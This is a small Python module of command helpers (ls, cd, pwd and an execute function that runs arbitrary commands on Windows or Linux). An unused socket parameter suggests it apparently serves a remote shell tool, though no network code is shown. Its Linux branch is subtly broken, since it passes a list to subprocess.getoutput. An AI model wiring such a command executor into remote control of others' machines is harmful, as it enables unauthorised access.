import subprocess
import os


w = ["Windows", "windows", "win", "Win"]
l=["Linux","linux","Unix","unix"]

def ls(os, sock):
    
    
    if os in w:
        res = subprocess.run(["cmd", "/c", "dir"], text=True, capture_output=True)
    else:
        res = subprocess.run(["ls"], text=True, capture_output=True)
    
    return res.stdout  
def cd(command):
    
    try:
        os.chdir(command[1])  # Change directory
        return f"Changed directory to {os.getcwd()}"
    except FileNotFoundError:
        return f"Directory not found: {command[1]}"
    except IndexError:
        return "No directory specified"
def pwd():
    return os.getcwd()
def execute(os,cmd):
    command = cmd[1:]  
    print(command)
    w_cmd=["cmd","/c"]+command
    print(w_cmd)
    try:
        if os in w:
            output = subprocess.run(w_cmd, text=True, capture_output=True)
            output=output.stdout
        else:
           output = subprocess.getoutput(command)
        if output:
            return output
        else:
            return "executed"
    except FileNotFoundError:
        return f"Command not found: {command}"